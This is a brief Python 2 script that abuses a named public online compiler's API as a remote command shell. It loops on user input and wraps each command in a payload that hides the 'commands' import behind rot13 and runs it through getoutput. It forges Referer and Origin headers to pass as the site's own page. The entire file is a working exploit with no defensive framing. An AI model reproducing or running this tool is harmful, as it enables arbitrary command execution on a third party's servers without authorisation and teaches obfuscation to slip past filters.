import requests
import json

url = 'https://m.runoob.com/api/compile.php'

payload = '''f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput(\'{}\')'''

headers = {
	'Referer':'https://c.runoob.com/compile/6',
	'Origin':'https://c.runoob.com'
}

while True:
	user_command = raw_input(">>")
	data = {
		'code':payload.format(user_command),
		'language':'0'
	}
	res = requests.post(url, data = data, headers = headers)
	# print res.content
	json_res = json.loads(res.content)
	print json_res['output']